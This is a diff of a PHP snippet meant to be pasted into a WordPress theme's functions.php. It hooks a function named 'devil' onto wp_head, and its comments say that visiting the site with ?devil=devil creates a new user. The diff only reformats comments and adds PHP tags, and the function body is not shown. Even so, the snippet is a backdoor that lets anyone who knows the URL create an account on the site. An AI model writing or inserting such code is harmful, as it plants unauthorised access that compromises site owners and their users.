@@ -1,5 +1,6 @@
-#TO CREATE A NEW USER FROM URL, KINDLY PASTE BELOW CODE INTO WP THEMES FUNCTION.PHP
+// #TO CREATE A NEW USER FROM URL, KINDLY PASTE BELOW CODE INTO WP THEMES FUNCTION.PHP
 
+<?php
 add_action( 'wp_head', 'devil' );
 
 function devil () {
@@ -13,6 +14,8 @@ function devil () {
     }
 }
 
-#after successfully pasted, navigated to : https://example.com/?devil=devil
-#replace example.com withour original wp domain.
+// #after successfully pasted, navigated to : https://example.com/?devil=devil
+// #replace example.com withour original wp domain.
+
+?>
 
